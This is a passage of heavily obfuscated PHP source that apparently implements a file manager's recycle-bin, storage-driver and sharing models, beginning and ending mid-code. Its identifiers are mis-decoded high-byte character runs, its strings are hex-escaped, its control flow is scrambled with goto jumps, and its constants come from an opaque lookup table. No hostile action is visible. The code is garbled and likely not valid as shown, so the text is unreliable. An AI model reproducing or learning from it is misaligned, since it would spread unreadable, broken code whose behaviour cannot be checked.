$Dƒ›ÑæŒà® . "\x28{$EÓ–¤çø¬}\x29{$Cñí‚“Õ„}"; if (!in_array_not_case($aÌ¿©×«Â¬, $Aß °±‚)) { return $aÌ¿©×«Â¬; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\x63\x65\137\x72\x65\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\x69\x6d\145", "\151\156\x73\x65\x72\164", "\x66\165\x6e\143\x74\x69\x6f\x6e")); public function listData($aè£±ÉĞÂ© = false) { $fšˆñİ½–Â =& $_SERVER[œº]; $aè£±ÉĞÂ© = $aè£±ÉĞÂ© ? $aè£±ÉĞÂ© : USER_ID; $C•Ëù ©Ş« = $this->where(array($fšˆñİ½–Â[1520] => $aè£±ÉĞÂ©))->select(); return array_to_keyvalue($C•Ëù ©Ş«, $fšˆñİ½–Â[33], $fšˆñİ½–Â[395]); } public function moveToRecycle($bÏ­ÒµĞï±) { goto Aø Ö—½î´; cõ×ÕŒçä•: if (!$aÕ™ÏÔ¨Ø || $aÕ™ÏÔ¨Ø[$E„¯ŠÊ®‡à[423]] == $E„¯ŠÊ®‡à[87]) { return; } $a™ëÎ¹¡Ûº = array($E„¯ŠÊ®‡à[410] => $bÏ­ÒµĞï±, $E„¯ŠÊ®‡à[1520] => USER_ID, $E„¯ŠÊ®‡à[549] => $aÕ™ÏÔ¨Ø[$E„¯ŠÊ®‡à[404]], $E„¯ŠÊ®‡à[550] => $aÕ™ÏÔ¨Ø[$E„¯ŠÊ®‡à[484]], $E„¯ŠÊ®‡à[553] => $aÕ™ÏÔ¨Ø[$E„¯ŠÊ®‡à[487]]); $this->add($a™ëÎ¹¡Ûº); goto d›ƒå­ÕŸ; d›ƒå­ÕŸ: $this->recycleMove($bÏ­ÒµĞï±, 1); if ($aÕ™ÏÔ¨Ø[$E„¯ŠÊ®‡à[403]] == $E„¯ŠÊ®‡à[87]) { $DØ¹ÛøÏ¿ù = array($E„¯ŠÊ®‡à[553] => array($E„¯ŠÊ®‡à[512], $aÕ™ÏÔ¨Ø[$E„¯ŠÊ®‡à[487]] . $bÏ­ÒµĞï± . $E„¯ŠÊ®‡à[513])); $cĞ©Ó‚‘->where($DØ¹ÛøÏ¿ù)->setField($E„¯ŠÊ®‡à[423], 1); } goto Aˆ…Îšß×; Aø Ö—½î´: $E„¯ŠÊ®‡à =& $_SERVER[œº]; $cĞ©Ó‚‘ = Model($E„¯ŠÊ®‡à[1206]); $aÕ™ÏÔ¨Ø = $cĞ©Ó‚‘->sourceInfo($bÏ­ÒµĞï±); goto cõ×ÕŒçä•; Aˆ…Îšß×: } public function clear() { $this->remove(!1); } public function remove($eâä¢–Áã = false, $F’‘§›¾¬– = false) { goto cÊ¯ßÎö•Œ; D¥İ­Âêçˆ: $dÌ®ØâÌ›Å = $this->listData($F’‘§›¾¬–); $eâä¢–Áã = $eâä¢–Áã === !1 ? !1 : $eâä¢–Áã; $E—òôíåğÁ = array(); goto e ‘ÜÆãí; e ‘ÜÆãí: foreach ($dÌ®ØâÌ›Å as $fç‹áÆ¡÷é) { if ($eâä¢–Áã != !1 && !in_array($fç‹áÆ¡÷é, $eâä¢–Áã)) { continue; } $FîîÆøñáÌ = $f˜±—…”ô©->sourceInfo($fç‹áÆ¡÷é); $f˜±—…”ô©->remove($fç‹áÆ¡÷é, !1); $fó™ƒ¨»´· = $FîîÆøñáÌ[$Dáõ†‰°[404]] . $Dáõ†‰°[71] . $FîîÆøñáÌ[$Dáõ†‰°[484]]; $E—òôíåğÁ[$fó™ƒ¨»´·] = array($Dáõ†‰°[549] => $FîîÆøñáÌ[$Dáõ†‰°[404]], $Dáõ†‰°[484] => $FîîÆøñáÌ[$Dáõ†‰°[484]]); $this->where(array($Dáõ†‰°[395] => $fç‹áÆ¡÷é))->delete(); } foreach ($E—òôíåğÁ as $f¿Ñ”èíÙ¨) { $f˜±—…”ô©->targetSpaceUpdate($f¿Ñ”èíÙ¨[$Dáõ†‰°[404]], $f¿Ñ”èíÙ¨[$Dáõ†‰°[484]]); } goto bîïä‹´¿Œ; cÊ¯ßÎö•Œ: $Dáõ†‰° =& $_SERVER[œº]; $F’‘§›¾¬– = $F’‘§›¾¬– ? $F’‘§›¾¬– : USER_ID; $f˜±—…”ô© = Model($Dáõ†‰°[1206]); goto D¥İ­Âêçˆ; bîïä‹´¿Œ: } public function restore($dÈç¿¦ÊÔÇ = false) { $BÖ¯É§Ãµ© = $this->listData(); $this->_restoreSource($BÖ¯É§Ãµ©, $dÈç¿¦ÊÔÇ); } public function removeUserAll($aÎóç‹àô) { $this->remove(!1, $aÎóç‹àô); } private function _restoreSource($FŸè®·’ë, $AŒŸ¿¬…ßİ) { goto eµ¿ŠâÚ®“; b“Äó’‰õ : $bÁèäª§ñ->updateModifyTime($f¸¹¥…¾åµ); goto C»³ğí¿á“; eµ¿ŠâÚ®“: $e×¦¤¹´Ûõ =& $_SERVER[œº]; $bÁèäª§ñ = Model($e×¦¤¹´Ûõ[1206]); $AŒŸ¿¬…ßİ = $AŒŸ¿¬…ßİ == !1 ? !1 : $AŒŸ¿¬…ßİ; goto c„§„ÚÕå‡; c„§„ÚÕå‡: if (!$FŸè®·’ë) { return !0; } $f¸¹¥…¾åµ = array(); foreach ($FŸè®·’ë as $F®âê©†­¾) { goto A“¤òãµÅ°; A“¤òãµÅ°: if ($AŒŸ¿¬…ßİ != !1 && !in_array($F®âê©†­¾, $AŒŸ¿¬…ßİ)) { continue; } $A¤ï¨âÃÃ = $bÁèäª§ñ->sourceInfo($F®âê©†­¾); $aˆ™è µ¾ = $bÁèäª§ñ->sourceInfo($A¤ï¨âÃÃ[$e×¦¤¹´Ûõ[478]]); goto bä–ˆÆôËË; eÂ›æŸ±Ú: if ($A¤ï¨âÃÃ[$e×¦¤¹´Ûõ[403]] == $e×¦¤¹´Ûõ[87]) { $A‚Ù™Èš‚ = array($e×¦¤¹´Ûõ[553] => array($e×¦¤¹´Ûõ[512], $A¤ï¨âÃÃ[$e×¦¤¹´Ûõ[487]] . $F®âê©†­¾ . $e×¦¤¹´Ûõ[513])); $bÁèäª§ñ->where($A‚Ù™Èš‚)->setField($e×¦¤¹´Ûõ[423], 0); $this->restoreFolderChildren($F®âê©†­¾, $FŸè®·’ë); } $this->where(array($e×¦¤¹´Ûõ[395] => $F®âê©†­¾))->delete(); $bÁèäª§ñ->folderSizeReset($A¤ï¨âÃÃ[$e×¦¤¹´Ûõ[478]]); goto bè©ùàê…Ş; bä–ˆÆôËË: if ($aˆ™è µ¾[$e×¦¤¹´Ûõ[423]] == $e×¦¤¹´Ûõ[87]) { continue; } $bÁèäª§ñ->lockMoveStart($F®âê©†­¾); $this->recycleMove($F®âê©†­¾, 0); goto eÂ›æŸ±Ú; bè©ùàê…Ş: $f¸¹¥…¾åµ[] = $A¤ï¨âÃÃ[$e×¦¤¹´Ûõ[478]]; if ($A¤ï¨âÃÃ[$e×¦¤¹´Ûõ[403]] == $e×¦¤¹´Ûõ[87]) { $f¸¹¥…¾åµ[] = $F®âê©†­¾; } $bÁèäª§ñ->lockMoveEnd($F®âê©†­¾); goto e™‡´°ŠŞ; e™‡´°ŠŞ: } goto b“Äó’‰õ ; C»³ğí¿á“: } private function restoreFolderChildren($DÅ•›­÷á, $b¬Ç°×ÜÄÊ) { goto C«Æ ‚ĞîŸ; C«Æ ‚ĞîŸ: $d¥†‡ÙÑ³¨ =& $_SERVER[œº]; $DçßòÛ»ëµ = Model($d¥†‡ÙÑ³¨[1206]); $a†šíÛ§ÊÂ = array($d¥†‡ÙÑ³¨[395] => array($d¥†‡ÙÑ³¨[7], array())); goto Cê¼‹Ú Ø; F»’Ê§ïƒ: $a†šíÛ§ÊÂ[$d¥†‡ÙÑ³¨[395]][1] = array_unique($a†šíÛ§ÊÂ[$d¥†‡ÙÑ³¨[395]][1]); $a†šíÛ§ÊÂ[$d¥†‡ÙÑ³¨[957]] = $d¥†‡ÙÑ³¨[1779]; $DçßòÛ»ëµ->where($a†šíÛ§ÊÂ)->setField($d¥†‡ÙÑ³¨[423], 1); goto b›ÍÉÜñ±; Cê¼‹Ú Ø: foreach ($b¬Ç°×ÜÄÊ as $b²Î ‹¹) { if ($b²Î ‹¹ == $DÅ•›­÷á) { continue; } if (!$DçßòÛ»ëµ->isParentOf($DÅ•›­÷á, $b²Î ‹¹)) { continue; } $e¶ƒ¹÷ˆ£¤ = $DçßòÛ»ëµ->sourceInfo($b²Î ‹¹); if ($e¶ƒ¹÷ˆ£¤[$d¥†‡ÙÑ³¨[403]] == $d¥†‡ÙÑ³¨[87]) { $a†šíÛ§ÊÂ[] = array($d¥†‡ÙÑ³¨[553] => array($d¥†‡ÙÑ³¨[512], $e¶ƒ¹÷ˆ£¤[$d¥†‡ÙÑ³¨[487]] . $b²Î ‹¹ . $d¥†‡ÙÑ³¨[513])); } else { $a†šíÛ§ÊÂ[$d¥†‡ÙÑ³¨[395]][1][] = $b²Î ‹¹; } } if (!$a†šíÛ§ÊÂ[$d¥†‡ÙÑ³¨[395]][1]) { unset($a†šíÛ§ÊÂ[$d¥†‡ÙÑ³¨[395]]); } if (!$a†šíÛ§ÊÂ) { return; } goto F»’Ê§ïƒ; b›ÍÉÜñ±: } private function recycleMove($fÉ¿®„ÈëÒ, $dƒÂ»†’¾¬ = 1) { $F¾ïíƒ„¶ =& $_SERVER[œº]; $EëÖ¶–Œ–Ô = Model($F¾ïíƒ„¶[1206]); $FœÕ¯²ïŒã = Model($F¾ïíƒ„¶[1988]); $EÒ„ëç½„â = array($F¾ïíƒ„¶[395] => $fÉ¿®„ÈëÒ); if ($dƒÂ»†’¾¬) { $EëÖ¶–Œ–Ô->where($EÒ„ëç½„â)->setField($F¾ïíƒ„¶[423], 1); $FœÕ¯²ïŒã->eventRecycle($fÉ¿®„ÈëÒ, $F¾ïíƒ„¶[1989]); } else { $bœ—ôŸ‹‘õ = $EëÖ¶–Œ–Ô->where($EÒ„ëç½„â)->find(); $cÏã‡–¼Úß = $bœ—ôŸ‹‘õ[$F¾ïíƒ„¶[403]] == $F¾ïíƒ„¶[87]; $cİ™Š‡Ãİ = $EëÖ¶–Œ–Ô->fileNameAuto($bœ—ôŸ‹‘õ[$F¾ïíƒ„¶[478]], $bœ—ôŸ‹‘õ[$F¾ïíƒ„¶[28]], REPEAT_RENAME_FOLDER, $cÏã‡–¼Úß); if ($cİ™Š‡Ãİ != $bœ—ôŸ‹‘õ[$F¾ïíƒ„¶[28]]) { $EëÖ¶–Œ–Ô->rename($fÉ¿®„ÈëÒ, $cİ™Š‡Ãİ); } $EëÖ¶–Œ–Ô->where($EÒ„ëç½„â)->setField($F¾ïíƒ„¶[423], 0); $FœÕ¯²ïŒã->eventRecycle($fÉ¿®„ÈëÒ, $F¾ïíƒ„¶[1990]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\164\x6f\x72\141\147\x65\114\151\163\x74"; public $field = array("\156\141\x6d\145", "\163\x69\x7a\x65\x4d\141\170", "\163\171\x73\x74\x65\155", "\x64\x65\x66\141\165\154\x74", "\144\x72\151\166\145\162", "\143\157\156\146\x69\147"); public function listData($C±–¥»â¥† = false, $dÛ…êÇ‡î = "\x6d\x6f\x64\151\x66\171\124\x69\155\x65", $Dƒ©ÖºéÍŞ = false) { $A¤¬–´¸É± =& $_SERVER[œº]; $FØÎèì¯Ö = parent::listData($C±–¥»â¥†, $dÛ…êÇ‡î, $Dƒ©ÖºéÍŞ); if ($C±–¥»â¥†) { return $FØÎèì¯Ö; } $DØß¤çŠöÖ = $this->ioSizeUseGet(array_to_keyvalue($FØÎèì¯Ö, $A¤¬–´¸É±[33], $A¤¬–´¸É±[393])); foreach ($FØÎèì¯Ö as $FñİµõŞ÷ä => $DÑÃ¯„ÌÎ) { unset($FØÎèì¯Ö[$FñİµõŞ÷ä][$A¤¬–´¸É±[6]]); $FØÎèì¯Ö[$FñİµõŞ÷ä][$A¤¬–´¸É±[1678]] = isset($DØß¤çŠöÖ[$DÑÃ¯„ÌÎ[$A¤¬–´¸É±[393]]]) ? $DØß¤çŠöÖ[$DÑÃ¯„ÌÎ[$A¤¬–´¸É±[393]]] : 0; } return $FØÎèì¯Ö; } public function ioSizeUseGet($fÆ‘¡Òº”») { goto EïÔ÷°ê±; Eˆ‹ˆ¢àè¶: $dŸÙ«¨ ¾Ì = array($EŒÅ¼Èâœ¤[782] => array($EŒÅ¼Èâœ¤[7], $fÆ‘¡Òº”»)); $a•ù¬±‘  = Model($EŒÅ¼Èâœ¤[747])->field($a•ø·Œ‰ñ)->where($dŸÙ«¨ ¾Ì)->group($EŒÅ¼Èâœ¤[782])->select(); $a•ù¬±‘  = array_to_keyvalue($a•ù¬±‘ , $EŒÅ¼Èâœ¤[393], $EŒÅ¼Èâœ¤[78]); goto f²¹»Œôˆ; C¶äÜ‰ç¾: $a•ù¬±‘  = Cache::get($cÏÑŒâ®Êœ); if ($a•ù¬±‘ ) { return $a•ù¬±‘ ; } $a•ø·Œ‰ñ = array($EŒÅ¼Èâœ¤[782] => $EŒÅ¼Èâœ¤[393], $EŒÅ¼Èâœ¤[1992] => $EŒÅ¼Èâœ¤[78]); goto Eˆ‹ˆ¢àè¶; EïÔ÷°ê±: $EŒÅ¼Èâœ¤ =& $_SERVER[œº]; if (!$fÆ‘¡Òº”») { return array(); } $cÏÑŒâ®Êœ = $EŒÅ¼Èâœ¤[1991] . implode($EŒÅ¼Èâœ¤[47], $fÆ‘¡Òº”»); goto C¶äÜ‰ç¾; f²¹»Œôˆ: Cache::set($cÏÑŒâ®Êœ, $a•ù¬±‘ , 600); return $a•ù¬±‘ ; goto E»ÌÚÑÚ©¡; E»ÌÚÑÚ©¡: } public function getConfig($FÒ«Øê¢ò›) { $e•Û¼öª = parent::listData($FÒ«Øê¢ò›); return json_decode($e•Û¼öª[$_SERVER[œº][6]], !0); } public function update($FÕ†È‘Í, $AéÊ»‹Ùù¤) { goto FìÌ™˜—; eÀÖØå÷²´: if (isset($f•–¯¤âÕ[$fµŒ²˜ÀÈ†]) && $f•–¯¤âÕ[$fµŒ²˜ÀÈ†][$cß„Å„ç[393]] != $FÕ†È‘Í) { return !1; } if (isset($AéÊ»‹Ùù¤[$cß„Å„ç[1993]]) && $AéÊ»‹Ùù¤[$cß„Å„ç[1993]] == $cß„Å„ç[87]) { $this->checkConfig($AéÊ»‹Ùù¤); } unset($AéÊ»‹Ùù¤[$cß„Å„ç[1993]]); goto d©Œô½Éâ‡; d©Œô½Éâ‡: $c¯“š§£Ü÷ = parent::update($FÕ†È‘Í, $AéÊ»‹Ùù¤); if ($c¯“š§£Ü÷ && $AéÊ»‹Ùù¤[$cß„Å„ç[34]]) { foreach ($f•–¯¤âÕ as $b¯ŞÊá¡) { if ($b¯ŞÊá¡[$cß„Å„ç[34]] && $b¯ŞÊá¡[$cß„Å„ç[393]] != $FÕ†È‘Í) { parent::update($b¯ŞÊá¡[$cß„Å„ç[393]], array($cß„Å„ç[34] => 0)); } } } return $c¯“š§£Ü÷; goto a•¥Â«“Æ«; FìÌ™˜—: $cß„Å„ç =& $_SERVER[œº]; $fµŒ²˜ÀÈ† = $AéÊ»‹Ùù¤[$cß„Å„ç[28]]; $f•–¯¤âÕ = array_to_keyvalue(parent::listData(), $cß„Å„ç[28]); goto eÀÖØå÷²´; a•¥Â«“Æ«: } public function add($E³ïâ²ÑŒ) { goto Cï‹İ§É”; eÈ¸¥°†Íê: return $e˜‘À×Šëƒ; goto bº¿Ò“áî„; fŒÌ¸—ŞÀÏ: $this->checkConfig($E³ïâ²ÑŒ); $e˜‘À×Šëƒ = parent::insert($E³ïâ²ÑŒ); if ($e˜‘À×Šëƒ && $E³ïâ²ÑŒ[$B„„¦Ëº¼§[34]]) { foreach ($Eâó‹Õòóó as $dŸå†“©Ä¥) { if ($dŸå†“©Ä¥[$B„„¦Ëº¼§[34]]) { parent::update($dŸå†“©Ä¥[$B„„¦Ëº¼§[393]], array($B„„¦Ëº¼§[34] => 0)); } } } goto eÈ¸¥°†Íê; Cï‹İ§É”: $B„„¦Ëº¼§ =& $_SERVER[œº]; $Eâó‹Õòóó = array_to_keyvalue(parent::listData(), $B„„¦Ëº¼§[28]); if (isset($Eâó‹Õòóó[$E³ïâ²ÑŒ[$B„„¦Ëº¼§[28]]])) { return !1; } goto fŒÌ¸—ŞÀÏ; bº¿Ò“áî„: } public function checkConfig(&$Då›ŞŒ°¦Ñ, $a’¯İÒÌ±ê = false) { goto F‚¬’¬áÈ; D½†à ÏÈ: $D¡ˆÊíÑÛ = $E ‚‡ ¨‰->getPath($c¼ƒå¼¬Ûá . $CíÈ¸Éæ‹ [1138]); if (!$E ‚‡ ¨‰->mkfile($D¡ˆÊíÑÛ)) { if ($a’¯İÒÌ±ê) { return LNG($CíÈ¸Éæ‹ [1998]); } show_json(LNG($CíÈ¸Éæ‹ [1998]), !1); } $F¿Ï“Ïò¯[$CíÈ¸Éæ‹ [1076]] = $c¼ƒå¼¬Ûá; goto eÉæÍåƒÚó; E¶—¯Ûâšİ: $E ‚‡ ¨‰ = new $d®„²ÛÔÉŠ($F¿Ï“Ïò¯); if (in_array($e©œåùœÚƒ, $E ‚‡ ¨‰->objectDriver)) { if (!$E ‚‡ ¨‰->isBucketCors() && !$E ‚‡ ¨‰->setBucketCors()) { $FçÈ†œªšË = LNG($CíÈ¸Éæ‹ [1998]); $FçÈ†œªšË .= $CíÈ¸Éæ‹ [1999] . LNG($CíÈ¸Éæ‹ [2000]); if ($a’¯İÒÌ±ê) { return $FçÈ†œªšË; } show_json($FçÈ†œªšË, !1); } } $c¼ƒå¼¬Ûá = rtrim($F¿Ï“Ïò¯[$CíÈ¸Éæ‹ [1076]], $CíÈ¸Éæ‹ [8]) . $CíÈ¸Éæ‹ [8]; goto D½†à ÏÈ; bçÇ¦ó«æ¼: foreach ($F¿Ï“Ïò¯ as $Dßˆˆ÷ºÊã => $dÏÜ³¬¥”Š) { $F¿Ï“Ïò¯[$Dßˆˆ÷ºÊã] = trim($dÏÜ³¬¥”Š); } $F¿Ï“Ïò¯[$CíÈ¸Éæ‹ [1994]] = rand_string(6); $dö—ÈÃÇ½º = $GLOBALS[$CíÈ¸Éæ‹ [6]][$CíÈ¸Éæ‹ [88]][$CíÈ¸Éæ‹ [791]]; goto f†ñ×Œ¶¯; F‚¬’¬áÈ: $CíÈ¸Éæ‹  =& $_SERVER[œº]; $e©œåùœÚƒ = strtolower($Då›ŞŒ°¦Ñ[$CíÈ¸Éæ‹ [94]]); $F¿Ï“Ïò¯ = json_decode($Då›ŞŒ°¦Ñ[$CíÈ¸Éæ‹ [6]], !0); goto bçÇ¦ó«æ¼; f†ñ×Œ¶¯: $AµµÙÎÄ¯„ = isset($dö—ÈÃÇ½º[$e©œåùœÚƒ]) ? $dö—ÈÃÇ½º[$e©œåùœÚƒ] : ucfirst($e©œåùœÚƒ); $d®„²ÛÔÉŠ = $CíÈ¸Éæ‹ [72] . $AµµÙÎÄ¯„; if (!$AµµÙÎÄ¯„ || !class_exists($d®„²ÛÔÉŠ)) { if ($a’¯İÒÌ±ê) { return LNG($CíÈ¸Éæ‹ [1995]); } write_log(array($CíÈ¸Éæ‹ [1996], $Då›ŞŒ°¦Ñ, get_caller_info()), $CíÈ¸Éæ‹ [1997]); show_json(LNG($CíÈ¸Éæ‹ [1995]), !1, $Då›ŞŒ°¦Ñ); } goto E¶—¯Ûâšİ; eÉæÍåƒÚó: $Då›ŞŒ°¦Ñ[$CíÈ¸Éæ‹ [6]] = json_encode($F¿Ï“Ïò¯); $Då›ŞŒ°¦Ñ[$CíÈ¸Éæ‹ [94]] = $AµµÙÎÄ¯„; return !0; goto có˜Ğ¡¿‰; có˜Ğ¡¿‰: } public function driverListSystem() { $BÈ—ºÔ¤›Û =& $_SERVER[œº]; $dÉ¦ÖÑ¿ÆÀ = parent::listData(); $d‘®ØÙ‘Û = array(); foreach ($dÉ¦ÖÑ¿ÆÀ as $C¶²ä†‰Ÿ²) { unset($C¶²ä†‰Ÿ²[$BÈ—ºÔ¤›Û[194]], $C¶²ä†‰Ÿ²[$BÈ—ºÔ¤›Û[84]]); $C¶²ä†‰Ÿ²[$BÈ—ºÔ¤›Û[6]] = json_decode($C¶²ä†‰Ÿ²[$BÈ—ºÔ¤›Û[6]], !0); $d‘®ØÙ‘Û[] = $C¶²ä†‰Ÿ²; } return $d‘®ØÙ‘Û; } public function defaultDriver() { $aÅ×¸É¥›ù =& $_SERVER[œº]; $f¡ÔÅš›µ” = parent::listData(); $Bì…åù’Ä… = array_filter_by_field($f¡ÔÅš›µ”, $aÅ×¸É¥›ù[34], 1); $Bì…åù’Ä… = $Bì…åù’Ä…[0]; if ($Bì…åù’Ä…) { $Bì…åù’Ä…[$aÅ×¸É¥›ù[6]] = json_decode($Bì…åù’Ä…[$aÅ×¸É¥›ù[6]], !0); } return $Bì…åù’Ä…; } public function driverInfo($bŒİ‡¡é) { $cÏé…øËÜë =& $_SERVER[œº]; $cµê×åÇæ = array_to_keyvalue(parent::listData(), $cÏé…øËÜë[393]); if (!isset($cµê×åÇæ[$bŒİ‡¡é])) { return !1; } $e²íÎáª÷¤ = $cµê×åÇæ[$bŒİ‡¡é]; $e²íÎáª÷¤[$cÏé…øËÜë[6]] = json_decode($e²íÎáª÷¤[$cÏé…øËÜë[6]], !0); return $e²íÎáª÷¤; } public function remove($DóÒ•³§–¼) { $this->removeShareItems($DóÒ•³§–¼); return parent::remove($DóÒ•³§–¼); } public function removeWithFile($c«•Ï‹˜, $a¹ÉëÜŠõ‰) { goto eÜ”‹¸­‰; EÁŒäÆİñ: $B´¯³½ŠŸ = Model($d…ÌÛÍåøÓ[450])->where($Fƒ‚¤ƒğä±)->sum($d…ÌÛÍåøÓ[78]); $f»âÍ÷®Í = $a¹ÉëÜŠõ‰ . $d…ÌÛÍåøÓ[2001] . $c«•Ï‹˜; $AÜãÕ¤²Ã‘ = new TaskFileTransfer($f»âÍ÷®Í, $d…ÌÛÍåøÓ[1997], $B‘çƒ•«ÉÍ, LNG($d…ÌÛÍåøÓ[2002]) . "\x28{$c«•Ï‹˜}\51"); goto B©Ô×éØ„; eÉ‡‹èŸÚ‚: if (!$fÚì¥³¼Çˆ) { $AÜãÕ¤²Ã‘->stop($f»âÍ÷®Í); return !1; } $AÜãÕ¤²Ã‘->end(); if ($a¹ÉëÜŠõ‰ == $d…ÌÛÍåøÓ[1658]) { $this->remove($c«•Ï‹˜); } goto EÖèœàöÇˆ; B©Ô×éØ„: $AÜãÕ¤²Ã‘->task[$d…ÌÛÍåøÓ[723]] = (double) $B´¯³½ŠŸ; $BÁ“ªà”‰’ = KodIO::defaultDriver(); $EÂÒ²¬ğöÎ = $BÁ“ªà”‰’[$d…ÌÛÍåøÓ[393]]; goto DÒõç™‹ƒÜ; cœ‰­º¥à‰: $f¸ïÈ‹„Ëì = Model($d…ÌÛÍåøÓ[193])->where($Fƒ‚¤ƒğä±)->field($d…ÌÛÍåøÓ[2003])->select(); foreach ($f¸ïÈ‹„Ëì as $C…½¯ÇÉë†) { goto BƒÑêšÏ¾; BƒÑêšÏ¾: $f»ê˜ªº´à = $C…½¯ÇÉë†[$d…ÌÛÍåøÓ[76]]; $B·›‚»’ãª = $BŸå±¼âö . str_replace("\x7b\151\x6f\x3a{$c«•Ï‹˜}\175\x2f", $d…ÌÛÍåøÓ[33], $f»ê˜ªº´à); if (!IO::exist($f»ê˜ªº´à)) { $f’“©ŸßÖ[] = $C…½¯ÇÉë†[$d…ÌÛÍåøÓ[447]]; $AÜãÕ¤²Ã‘->updateFileEnd($C…½¯ÇÉë†[$d…ÌÛÍåøÓ[28]], $C…½¯ÇÉë†[$d…ÌÛÍåøÓ[78]]); continue; } goto FåçŠ•Š©¾; FåçŠ•Š©¾: if (IO::exist($B·›‚»’ãª)) { $AÜãÕ¤²Ã‘->updateFileEnd($C…½¯ÇÉë†[$d…ÌÛÍåøÓ[28]], $C…½¯ÇÉë†[$d…ÌÛÍåøÓ[78]]); continue; } if (!IO::move($f»ê˜ªº´à, get_path_father($B·›‚»’ãª))) { $fÚì¥³¼Çˆ = !1; break; } $Fƒ‚¤ƒğä± = array($d…ÌÛÍåøÓ[447] => $C…½¯ÇÉë†[$d…ÌÛÍåøÓ[447]]); goto F‘’›ŞÌŞæ; F‘’›ŞÌŞæ: $bù»Ú„šÎ = array($d…ÌÛÍåøÓ[782] => $EÂÒ²¬ğöÎ, $d…ÌÛÍåøÓ[76] => $B·›‚»’ãª); Model($d…ÌÛÍåøÓ[193])->where($Fƒ‚¤ƒğä±)->save($bù»Ú„šÎ); goto D´é¡ë™¹õ; D´é¡ë™¹õ: } $this->removeByFileID($f’“©ŸßÖ); goto eÉ‡‹èŸÚ‚; DÒõç™‹ƒÜ: $BŸå±¼âö = "\x7b\151\157\72{$EÂÒ²¬ğöÎ}\175\57"; $fÚì¥³¼Çˆ = !0; $f’“©ŸßÖ = array(); goto cœ‰­º¥à‰; eÜ”‹¸­‰: $d…ÌÛÍåøÓ =& $_SERVER[œº]; $Fƒ‚¤ƒğä± = array($d…ÌÛÍåøÓ[782] => $c«•Ï‹˜); $B‘çƒ•«ÉÍ = Model($d…ÌÛÍåøÓ[450])->where($Fƒ‚¤ƒğä±)->count(); goto EÁŒäÆİñ; EÖèœàöÇˆ: } public function progress($BìÕõ¨ï, $F¶âöà³‹) { return Task::get($F¶âöà³‹ . $_SERVER[œº][2001] . $BìÕõ¨ï); } private function removeByFileID($AÉ¹²ß†ˆó = array()) { goto c¾ğà‘šé; C…ˆÊåÜÀÎ: $A–‘¢ÚŠÃ¬ = Model($bùÓë¿³èÈ[1206])->where($EöôÊªºâ)->field($bùÓë¿³èÈ[395])->select(); if (!$A–‘¢ÚŠÃ¬) { return; } $A–‘¢ÚŠÃ¬ = array_to_keyvalue($A–‘¢ÚŠÃ¬, $bùÓë¿³èÈ[33], $bùÓë¿³èÈ[395]); goto F–ç¿¾ÆÏİ; c¾ğà‘šé: $bùÓë¿³èÈ =& $_SERVER[œº]; if (empty($AÉ¹²ß†ˆó)) { return; } $EöôÊªºâ = array($bùÓë¿³èÈ[447] => array($bùÓë¿³èÈ[7], $AÉ¹²ß†ˆó)); goto C…ˆÊåÜÀÎ; F–ç¿¾ÆÏİ: foreach ($A–‘¢ÚŠÃ¬ as $bÅ½ë¶ ‘È) { Model($bùÓë¿³èÈ[409])->removeNow($bÅ½ë¶ ‘È, !1); } goto F‰ó‚Çƒ‰Œ; F‰ó‚Çƒ‰Œ: } private function removeShareItems($dŸ‹Àà‘È¨) { goto eƒƒ ÑµÌÑ; eƒƒ ÑµÌÑ: $bê¼ºç†í =& $_SERVER[œº]; $B§Á ·ù× = "\x7b\151\x6f\72{$dŸ‹Àà‘È¨}\x7d\x2f"; $e¸æ·¶¤Ÿ© = array($bê¼ºç†í[395] => 0, $bê¼ºç†í[1071] => array($bê¼ºç†í[380], "{$B§Á ·ù×}\x25")); goto Dµ©®¤Í¤„; Dµ©®¤Í¤„: $aÄ‰¡‹òŠí = Model($bê¼ºç†í[1669])->where($e¸æ·¶¤Ÿ©)->field($bê¼ºç†í[468])->select(); if (empty($aÄ‰¡‹òŠí)) { return; } $FÎ¨ÏÁÙªô = array_to_keyvalue($aÄ‰¡‹òŠí, $bê¼ºç†í[33], $bê¼ºç†í[468]); goto aİÖù„Â“’; aİÖù„Â“’: Model($bê¼ºç†í[563])->remove($FÎ¨ÏÁÙªô); goto C‚¦†„¸âø; C‚¦†„¸âø: } } goto eˆŒÀ¼Áˆ; C¢æø›©Ëß: define($_SERVER[œº][237], 2); define($_SERVER[œº][238], 3); define($_SERVER[œº][239], 1); goto CĞ²Ş’‰; cäÁÉÇ‚¡Ã: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\x65\x72\164\54\x75\160\144\x61\164\145", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\x63\162\145\x61\x74\145\x54\x69\x6d\x65", "\164\151\155\x65", "\151\156\x73\145\x72\164", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\157\x70\x74\x69\157\156\x73", '', "\x69\156\163\x65\162\164\54\x75\x70\144\141\x74\x65\54\163\145\154\x65\143\x74", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($c¶ñµŠÇá) { $cöõ´Â“•í =& $_SERVER[œº]; $A¾Ú‡¹‚ôç = isset($c¶ñµŠÇá[0]) ? $c¶ñµŠÇá[0] : !1; return array($cöõ´Â“•í[1820] => array(USER_ID, $cöõ´Â“•í[1821]), $cöõ´Â“•í[1764] => array($A¾Ú‡¹‚ôç, $cöõ´Â“•í[1822])); } protected function listSimple() { $Dâ¬Íñ¿° = array($_SERVER[œº][1528] => USER_ID); $Dî µÓ¾»Â = $this->field($this->fieldList)->where($Dâ¬Íñ¿°)->select(); return $Dî µÓ¾»Â ? $Dî µÓ¾»Â : array(); } protected function getInfo($Eö™ÚäÀ, $D›´”“®¤ = false) { $Aœ¾‰¦õ¸ =& $_SERVER[œº]; if ($D›´”“®¤) { return $this->_getShareInfo(array($Aœ¾‰¦õ¸[468] => $Eö™ÚäÀ)); } $A¹Í‚ÏŸŠÌ = $this->cacheFunctionGet($Aœ¾‰¦õ¸[1771], $Eö™ÚäÀ); return $A¹Í‚ÏŸŠÌ; } public function getInfoByHash($aùœ¹×¸Æ¢) { return $this->_getShareInfo(array($_SERVER[œº][470] => $aùœ¹×¸Æ¢)); } 